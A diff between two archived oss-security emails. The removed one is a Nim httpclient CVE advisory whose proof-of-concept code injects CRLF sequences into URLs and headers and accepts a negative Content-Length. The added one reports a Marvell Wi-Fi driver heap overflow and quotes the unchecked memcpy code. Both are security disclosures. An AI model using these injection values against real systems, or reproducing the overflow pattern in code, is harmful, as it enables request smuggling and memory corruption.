@@ -1,9 +1,9 @@
 X-VM-v5-Data: ([nil t nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil]
-	["5943" "Thursday" "4" "February" "2021" "11:36:50" "+0100" "Martin Ortner" "martin.ortner@consensys.net" "<E06593B2-81E5-4610-B127-D5D313036A1C@consensys.net>" "231" "[oss-security] [CVE-2020-15693, CVE-2020-15694] Nim - stdlib Httpclient - Header Crlf Injection & Server Response Validation" nil nil nil "2" "2021020410:36:50" "[oss-security] [CVE-2020-15693, CVE-2020-15694] Nim - stdlib Httpclient - Header Crlf Injection & Server Response Validation" (number mark "U       martin.ortne Feb  4  231/5943  " thread-indent "\"[oss-security] [CVE-2020-15693, CVE-2020-15694] Nim - stdlib Httpclient - Header Crlf Injection & Server Response Validation\"\n") nil nil nil nil nil nil nil nil nil "[oss-security] [CVE-2020-15693, CVE-2020-15694] Nim - stdlib Httpclient - Header Crlf Injection & Server Response Validation" nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil]
+	["4554" "Saturday" "1" "June" "2019" "18:07:57" "+0800" "huangwen" "huangwen@venusgroup.com.cn" "<000001d51861$e546e2a0$afd4a7e0$@com.cn>" "230" "[oss-security] Marvell Wifi Driver mwifiex_uap_parse_tail_ies Heap Overflow" nil nil nil "6" "2019060110:07:57" "[oss-security] Marvell Wifi Driver mwifiex_uap_parse_tail_ies Heap Overflow" (number mark "U       huangwen@ven Jun  1  230/4554  " thread-indent "\"[oss-security] Marvell Wifi Driver mwifiex_uap_parse_tail_ies Heap Overflow\"\n") nil nil nil nil nil nil nil nil nil "[oss-security] Marvell Wifi Driver mwifiex_uap_parse_tail_ies Heap Overflow" nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil]
 	nil)
 X-Mozilla-Status: 0000
 X-Mozilla-Status2: 00000000
-Received: (qmail 1961 invoked by uid 550); 4 Feb 2021 11:03:03 -0000
+Received: (qmail 12170 invoked by uid 550); 1 Jun 2019 10:30:54 -0000
 Mailing-List: contact oss-security-help@lists.openwall.com; run by ezmlm
 Precedence: bulk
 List-Post: <mailto:oss-security@lists.openwall.com>
@@ -12,276 +12,252 @@ List-Unsubscribe: <mailto:oss-security-unsubscribe@lists.openwall.com>
 List-Subscribe: <mailto:oss-security-subscribe@lists.openwall.com>
 List-ID: <oss-security.lists.openwall.com>
 Reply-To: oss-security@lists.openwall.com
-Received: (qmail 24272 invoked from network); 4 Feb 2021 10:37:04 -0000
-DKIM-Signature: v=1; a=rsa-sha256; c=relaxed/relaxed;
-        d=consensys.net; s=google;
-        h=from:content-transfer-encoding:mime-version:subject:message-id:date
-         :to;
-        bh=U+IP+k9HYkXFeAEkXXd8yCrxVwZ83hVCVju/XoJEjZM=;
-        b=iv9+MORvBBnu/oUydQmIJqV3Bp5ToOuYaWlMLYGoWXGtqy8iKe/c3gVfQlG/zlcffT
-         DG4Zi1PsmpL7ErVizGna78Lntj0Sbx/IfnkXEWZ4IfjMRGujkvS194Q1IlehJcljcS3t
-         82O23dwA25nsPw8DpmJrbiOh1ny56tNMm5xx8RzYIHrwHO23k1PgUwrt/yhl1eMpzD7Z
-         RKnveORTBffk8FzuIge2MVN7E5unFOfKQHPm+TyC4QZeNvvXMkWLB6rgEIWvjlG8dH1G
-         x/cX3FnbOKXeocI4fwooZQ/Z7NiwPi1nIvB8Zt3IQU6Is4+tdLPf6XnEJabSTeJAFwRW
-         14Ug==
-X-Google-DKIM-Signature: v=1; a=rsa-sha256; c=relaxed/relaxed;
-        d=1e100.net; s=20161025;
-        h=x-gm-message-state:from:content-transfer-encoding:mime-version
-         :subject:message-id:date:to;
-        bh=U+IP+k9HYkXFeAEkXXd8yCrxVwZ83hVCVju/XoJEjZM=;
-        b=pcQs+ZT4KjH2wpUJR1bsO58cSfA3Sj9oDQ/L4Wo1COQftfvrkWO30X7hTy+4JxGfke
-         baj2d5HxB0VAJSm/q9IFUACeXXfbl59w2xHUFo2qrIRcUesHdqE7hYE4sxXP6/JS1dVQ
-         OzdFeX2EuRm0CA2W+7pUGbBIjZh3yoFSSd+EbnMm+FYXEAwKviY4mu5ajowdKP/G4D8t
-         T8FuJqjonw0ksqls6DWMhe2edEgWCF7XWO2JhPu2Jd328YmjlL4K9tWIUqJjOFVAvmRy
-         eN2BeyYSCmHeCJZRUbEZlYWQCxwI3QGg+2LbCMfdtH7UoFvjWWV9bFuV3szGPLMIeZwc
-         vSjg==
-X-Gm-Message-State: AOAM533BKiLZlt8TowahTf/Xsu10fxKK18QvlpnyY7sFSqNMaPVSP4Dc
-	TgwBkXlnBEL6pxC5UfOBkPTtuwiQggqSc7NLfmdea79hWRlhCc+W5oilCDHpZd40rRLaMHYSGhe
-	uVvos/AL0lYqAYHyUR9lIrmGu4lIJclJdZSekVIhkHFVPPlyOCeiJ0/37gV5sYwu2r+RKEWooo8
-	1IenDtyE/DImfHYBq7Ea8=
-X-Google-Smtp-Source: ABdhPJwgwwqlDX8C5ZnyP2I3DHnWTECZJ6HdEW/Am9iI0mbvjgQ6b8/4IDYKm226n5c/1Yg8M36g8w==
-X-Received: by 2002:a7b:ce93:: with SMTP id q19mr6961379wmj.65.1612435012320;
-        Thu, 04 Feb 2021 02:36:52 -0800 (PST)
-From: Martin Ortner <martin.ortner@consensys.net>
+Received: (qmail 26261 invoked from network); 1 Jun 2019 10:08:39 -0000
+From: "huangwen" <huangwen@venusgroup.com.cn>
+To: <oss-security@lists.openwall.com>
+Date: Sat, 1 Jun 2019 18:07:57 +0800
+Message-ID: <000001d51861$e546e2a0$afd4a7e0$@com.cn>
+MIME-Version: 1.0
+Content-Type: multipart/alternative;
+	boundary="----=_NextPart_000_0001_01D518A4.F36A22A0"
+X-Mailer: Microsoft Office Outlook 12.0
+Thread-Index: AdUYYeBR0J/c6s/5R6eSZdvsJFrrUg==
+Content-Language: zh-cn
+x-cr-hashedpuzzle: jhU= 40o= ALLX AOsB BL09 BZg5 Bgwe CbCk FyuM F6EU GAjP GStS GWJm GcBJ Gmvc G7BZ;1;bwBzAHMALQBzAGUAYwB1AHIAaQB0AHkAQABsAGkAcwB0AHMALgBvAHAAZQBuAHcAYQBsAGwALgBjAG8AbQA=;Sosha1_v1;7;{836F99F0-649F-4F41-94C9-637EEEFAE605};aAB1AGEAbgBnAHcAZQBuAEAAdgBlAG4AdQBzAGcAcgBvAHUAcAAuAGMAbwBtAC4AYwBuAA==;Sat, 01 Jun 2019 10:07:53 GMT;TQBhAHIAdgBlAGwAbAAgAFcAaQBmAGkAIABEAHIAaQB2AGUAcgAgAG0AdwBpAGYAaQBlAHgAXwB1AGEAcABfAHAAYQByAHMAZQBfAHQAYQBpAGwAXwBpAGUAcwAgAEgAZQBhAHAAIABPAHYAZQByAGYAbABvAHcA
+x-cr-puzzleid: {836F99F0-649F-4F41-94C9-637EEEFAE605}
+X-FangMail-Miltered: at mailgateway1 with ID 5CF24E93.004 by FangMail milter!
+X-FangMail-Envelope: 1559383704/232361FFAB/5CF24E93.004/111.201.151.56/[111.201.151.56]/HWPC/<huangwen@venusgroup.com.cn>
+X-FangMail-Bounce-Flag: 1559383704.5CF24E93.004
+X-FangMail-Outinfo: 1559383704/5CF24E93.004/232361FFAB/huangwen@venusgroup.com.cn/1
+Subject: [oss-security] Marvell Wifi Driver mwifiex_uap_parse_tail_ies Heap Overflow
+
+------=_NextPart_000_0001_01D518A4.F36A22A0
 Content-Type: text/plain;
-	charset=utf-8
-Content-Transfer-Encoding: quoted-printable
-Mime-Version: 1.0 (Mac OS X Mail 13.4 \(3608.120.23.2.4\))
-Message-Id: <E06593B2-81E5-4610-B127-D5D313036A1C@consensys.net>
-Date: Thu, 4 Feb 2021 11:36:50 +0100
-To: oss-security@lists.openwall.com
-X-Mailer: Apple Mail (2.3608.120.23.2.4)
-Subject: [oss-security] [CVE-2020-15693, CVE-2020-15694] Nim - stdlib Httpclient - Header
- Crlf Injection & Server Response Validation
+	charset="us-ascii"
+Content-Transfer-Encoding: 7bit
 
-title: "Nim - stdlib Httpclient - Header Crlf Injection & Server Response V=
-alidation"
-date: 2020-07-30T18:41:52+01:00
+Hi,
 
-cve: ["CVE-2020-15693", "CVE-2020-15694"]
-vendor: nim-lang
-vendorUrl: https://nim-lang.org/
-authors: tintinweb
-affectedVersions: [ "<=3D 1.2.6" ]
-vulnClass: CWE-93
+There is heap-based buffer overflow in marvell wifi chip driver in Linux
+kernel,allows local users to cause a denial of service(system crash) or
+possibly execute arbitrary code.
 
-Vulnerability Note: https://consensys.net/diligence/vulnerabilities/nim-htt=
-pclient-header-crlf-injection/=20
-Vulnerability Note: https://github.com/tintinweb/pub/blob/master/pocs/cve-2=
-020-15694/=20
-Group: https://consensys.net/diligence/research/=20
+I provided a patch in mail attachment for reference only. 
+
+ 
+
+ 
+
+Description
+
+==========
+
+The problem is inside mwifiex_uap_parse_tail_ies function in
+drivers/net/wireless/marvell/mwifiex/ie.c. 
+
+There are two memcpy in this function.The memcpy in while loop will be
+called when element_id is not equal to WLAN_EID_SSID,WLAN_EID_SUPP_RATES
+etc.
+
+The copy dst buffer gen_ie->ie_buffer is a array with size
+IEEE_MAX_IE_SIZE(256), the src buffer is element in cfg80211_beacon_data
+from user space. 
+
+There is not len check for two memcpy in this function.
+
+If special elements are constructed (E.g.
+WLAN_EID_SUPPORTED_OPERATING_CLASSES) to make memcpy called repeatedly, will
+finally trigger the overflow.
+
+ 
+
+ 
+
+struct mwifiex_ie {
+
+         __le16 ie_index;
+
+         __le16 mgmt_subtype_mask;
+
+         __le16 ie_length;
+
+         u8 ie_buffer[IEEE_MAX_IE_SIZE];
+
+} __packed;
+
+ 
+
+#define IEEE_MAX_IE_SIZE              256
+
+ 
+
+static int mwifiex_uap_parse_tail_ies(struct mwifiex_private *priv,
+
+                                           struct cfg80211_beacon_data
+*info)
+
+{
+
+         struct mwifiex_ie *gen_ie;
+
+         struct ieee_types_header *hdr;
+
+         struct ieee80211_vendor_ie *vendorhdr;
+
+         u16 gen_idx = MWIFIEX_AUTO_IDX_MASK, ie_len = 0;
+
+         int left_len, parsed_len = 0;
+
+ 
+
+         if (!info->tail || !info->tail_len)
+
+                   return 0;
+
+ 
+
+         gen_ie = kzalloc(sizeof(*gen_ie), GFP_KERNEL);
+
+         if (!gen_ie)
+
+                   return -ENOMEM;
+
+ 
+
+         left_len = info->tail_len;
+
+ 
+
+         /* Many IEs are generated in FW by parsing bss configuration.
+
+          * Let's not add them here; else we may end up duplicating these
+IEs
+
+          */
+
+         while (left_len > sizeof(struct ieee_types_header)) {
+
+                   hdr = (void *)(info->tail + parsed_len);
+
+                   switch (hdr->element_id) {
+
+                   case WLAN_EID_SSID:
+
+                   case WLAN_EID_SUPP_RATES:
+
+                   case WLAN_EID_COUNTRY:
+
+                   case WLAN_EID_PWR_CONSTRAINT:
+
+                   case WLAN_EID_ERP_INFO:
+
+                   case WLAN_EID_EXT_SUPP_RATES:
+
+                   case WLAN_EID_HT_CAPABILITY:
+
+                   case WLAN_EID_HT_OPERATION:
+
+                   case WLAN_EID_VHT_CAPABILITY:
+
+                   case WLAN_EID_VHT_OPERATION:
+
+                            break;
+
+                   case WLAN_EID_VENDOR_SPECIFIC:
+
+                            /* Skip only Microsoft WMM IE */
+
+                            if (cfg80211_find_vendor_ie(WLAN_OUI_MICROSOFT,
+
+ 
+WLAN_OUI_TYPE_MICROSOFT_WMM,
+
+                                                            (const u8 *)hdr,
+
+                                                            hdr->len +
+sizeof(struct ieee_types_header)))
+
+                                     break;
+
+                            /* fall through */
+
+                   default:
+
+                            memcpy(gen_ie->ie_buffer + ie_len, hdr,
+//!!!!!!overflow
+
+                                   hdr->len + sizeof(struct
+ieee_types_header));
+
+                            ie_len += hdr->len + sizeof(struct
+ieee_types_header);
+
+                            break;
+
+                   }
+
+                   left_len -= hdr->len + sizeof(struct ieee_types_header);
+
+                   parsed_len += hdr->len + sizeof(struct
+ieee_types_header);
+
+         }
+
+ 
+
+         /* parse only WPA vendor IE from tail, WMM IE is configured by
+
+          * bss_config command
+
+          */
+
+         vendorhdr = (void *)cfg80211_find_vendor_ie(WLAN_OUI_MICROSOFT,
+
+ 
+WLAN_OUI_TYPE_MICROSOFT_WPA,
+
+                                                            info->tail,
+info->tail_len);
+
+         if (vendorhdr) {
+
+                   memcpy(gen_ie->ie_buffer + ie_len, vendorhdr,
+//!!!!!!overflow
+
+                          vendorhdr->len + sizeof(struct
+ieee_types_header));
+
+                   ie_len += vendorhdr->len + sizeof(struct
+ieee_types_header);
+
+         }
+
+         .....
+
+}
+
+ 
+
+ 
+
+Credit
+
+==========
+
+This issue was discovered by huangwen of ADLab of Venustech
+
+ 
+
+ 
+
+Patch
+
+=====
+
+https://lore.kernel.org/linux-wireless/20190531131841.7552-1-tiwai@suse.de
+
+ 
 
 
-## Summary=20
-
-The following vulnerability note discusses two classes of vulnerabilities f=
-ound in the nim-lang `httpClient` standard library:
-
-* a `CR-LF` injection in various arguments
-* lack of response value validation when parsing server responses
-
-
-## Details
-
-### Description
-
-The nim standard library `httpClient` is vulnerable to a `CR-LF` injection =
-in the target url. This issue shares similarities with [CVE-2019-9740](http=
-s://nvd.nist.gov/vuln/detail/CVE-2019-9740) and [CVE-2019-9947](https://nvd=
-.nist.gov/vuln/detail/CVE-2019-9947) reported for the Python language with =
-the difference that more injection vectors exist. An injection is possible =
-if the attacker controls any part of the url provided to `httpClient.[get|p=
-ost|...]`, the user-agent, or custom http header names or values.=20
-
-
-Additionally, the library fails to properly validate the server response. F=
-or example, `httpClient.get().contentLength()` does not raise any error if =
-a malicious server provides a negative `Content-Length`.
-
-
-It should be noted that there seems to be a general lack of input validatio=
-n (requests and response) and we expect more vectors to exist (e.g. see `ge=
-nerateHeaders`).
-
-
-### Proof of Concept
-
-Note: `nim c -r -d:ssl client_inject.nim`
-
-1) header injection in any url part
-
-a) query
-
-```nim
-import httpClient
-var client =3D newHttpClient()
-var response =3D client.get("https://localhost:4433?a=3D1 HTTP/1.1\r\nX-inj=
-ected: header\r\nTEST: 123")=20
-echo response.contentLength()
-echo response.body()
-```
-
-Serialized request: see `X-injected`
-
-```http
-GET /?a=3D1 HTTP/1.1
-X-injected: header
-TEST: 123 HTTP/1.1
-Host: localhost:4433
-Connection: Keep-Alive
-content-length: 0
-user-agent: Nim httpclient/1.2.4
-
-```
-
-b) in the path
-
-```nim
-import httpClient
-var client =3D newHttpClient()
-var response =3D client.get("https://localhost:4433/a/1 HTTP/1.1\r\nX-injec=
-ted: header\r\nTEST: 123")
-echo response.contentLength()
-echo response.body()
-```
-
-Serialized request: see `X-injected`
-
-```http
-GET /a/1 HTTP/1.1
-X-injected: header
-TEST: 123 HTTP/1.1
-Host: localhost:4433
-Connection: Keep-Alive
-content-length: 0
-user-agent: Nim httpclient/1.2.4
-
-
-```
-
-2) header injection in user-agent, http headers
-
-```nim
-import httpClient
-var client =3D newHttpClient("MyUserAgent\r\nX-Injected: myheader")
-client.headers =3D newHttpHeaders({ "Content-Type": "applicat\r\nion/json" =
-})
-var response =3D client.get("https://localhost:4433?a=3D1 HTTP/1.1\r\nX-inj=
-ected: header\r\nTEST: 123")
-echo response.contentLength()
-echo response.body()
-```
-
-Serialized request: see `X-injected`, `TEST: 123`
-
-```http
-GET /?a=3D1 HTTP/1.1
-X-injected: header
-TEST: 123 HTTP/1.1
-Host: localhost:4433
-Connection: Keep-Alive
-content-length: 0
-content-type: applicat
-ion/json
-user-agent: MyUserAgent
-X-Injected: myheader
-
-
-```
-
-3) Integers are parsed as signed ints instead of natural numbers
-
-The `httpClient` silently accepts invalid return parameters. For example, t=
-he content-length header is initially stored as a string without being veri=
-fied to be in a proper range. When accessing it, it is being parsed as a si=
-gned integer and therefore allows to return negative numbers.
-
-```nim
-proc contentLength*(response: Response | AsyncResponse): int =3D
-## Retrieves the specified response's content length.
-##
-## This is effectively the value of the "Content-Length" header.
-##
-## A ``ValueError`` exception will be raised if the value is not an integer.
-var contentLengthHeader =3D response.headers.getOrDefault("Content-Length")
-return contentLengthHeader.parseInt()
-```
-
-Request:
-```http
-GET /?a=3D1 HTTP/1.1
-X-injected: header
-TEST: 123 HTTP/1.1
-Host: localhost:4433
-Connection: Keep-Alive
-content-length: 0
-user-agent: Nim httpclient/1.2.4
-
-```
-
-Malicious server response: `Content-Length: -23`
-```http
-HTTP/1.1 200 OK
-Date: Sun, 10 Oct 2010 23:26:07 GMT
-Server: Apache/2.2.8 (Ubuntu) mod_ssl/2.2.8 OpenSSL/0.9.8g
-Last-Modified: Sun, 26 Sep 2010 22:04:35 GMT
-ETag: "45b6-834-49130cc1182c0"
-Accept-Ranges: bytes
-Content-Length: -23
-Connection: close
-Content-Type: text/html
-
-Hello world!
-
-```
-
-Accessing the `Content-Length` yields the negative number -23.
-
-```nim
-import httpClient
-var client =3D newHttpClient()
-var response =3D client.get("http://localhost:4433/a/1 HTTP/1.1\r\nX-i\x00\=
-x01YOnjected: header\r\nTEST: 123")
-echo response.contentLength()
-echo response.body()
-```
-
-output:
-
-```
-=E2=87=92 nim c -r -d:ssl client_inject.nim
-...
-Hint: [Link]
-Hint: 112071 LOC; 1.103 sec; 112.691MiB peakmem; Debug build; proj: /Users/=
-tintin/workspace/nim/test/issues/httpclient/inject/client_inject.nim; out: =
-/Users/tintin/workspace/nim/test/issues/httpclient/inject/client_inject [Su=
-ccessX]
-Hint: /Users/tintin/workspace/nim/test/issues/httpclient/inject/client_inje=
-ct [Exec]
--23
-```
-
-This might pose a risk to applications that are not checking whether respon=
-se values are within sane bounds.
-
-
-## Vendor Response
-
-Vendor response: fixed in [v1.2.6](https://nim-lang.org/blog/2020/07/30/ver=
-sions-126-and-108-released.html)
-
-### Timeline
-
-```
-JUL/09/2020 - contact nim developers @telegram; provided details, PoC
-JUL/30/2020 - fixed in new release
-```
-
-## References
-
-* [1] https://nim-lang.org/
-* [2] https://nim-lang.org/install.html
-* [3] https://en.wikipedia.org/wiki/Nim_(programming_language)
-* [4] https://nim-lang.org/blog/2020/07/30/versions-126-and-108-released.ht=
-ml
+------=_NextPart_000_0001_01D518A4.F36A22A0--
 
